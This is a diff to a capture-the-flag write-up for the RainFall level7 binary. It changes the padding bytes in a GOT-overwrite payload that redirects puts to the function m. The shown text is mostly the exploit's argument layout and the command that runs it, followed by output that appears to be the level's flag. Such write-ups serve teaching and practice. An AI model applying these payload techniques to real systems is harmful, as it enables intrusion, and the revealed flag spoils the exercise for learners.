@@ -85,13 +85,13 @@ We can then craft our payload:
 arg1 = padding + address of the GOT entry for puts
 arg2 = address of m
 
-arg1 = "A"*20 + "\x08\x04\x99\x28"
+arg1 = "\x90"*20 + "\x08\x04\x99\x28"
 arg2 = "\x08\x04\x84\xf4"
 ```
 
 Let's run our payload:
 ```bash
-level7@RainFall:~$ ./level7 `python -c 'print("A"*20 + "\x08\x04\x99\x28"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
+level7@RainFall:~$ ./level7 `python -c 'print("\x90"*20 + "\x08\x04\x99\x28"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1702752190
 ```
